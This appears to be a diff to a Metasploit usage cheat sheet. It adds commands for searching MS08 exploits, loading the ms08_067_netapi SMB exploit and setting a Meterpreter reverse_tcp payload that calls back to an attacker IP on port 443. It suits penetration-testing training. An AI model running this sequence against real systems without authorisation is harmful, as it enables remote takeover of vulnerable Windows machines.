@@ -66,13 +66,19 @@ show -h                       Show help on the 'show' command.
 
 # Basic usage
 
+show <all, auxilary, encoders, exploits, nops, payloads, plugins>
+search <string>
 search ms08                   Show all Microsoft exploits released in 2008.
+grep php show payloads        Show all payloads using php.
 
 use exploit/windows/smb/ms08_067_netapi
+show info
 show targets                  Show OSs that can be targeted with this exploit.
+set target 0
 show payloads                 Show all payloads that work with this exploit.
 set payload windows/meterpreter/reverse_tcp
 show options                  Show remainging options for the payload.
+show advanced
 set lhost <attacker IP>       Set the listner to the attacker's IP.
 set lport 443                 Set the listening port to 443.
 exploit                       Run the exploit.
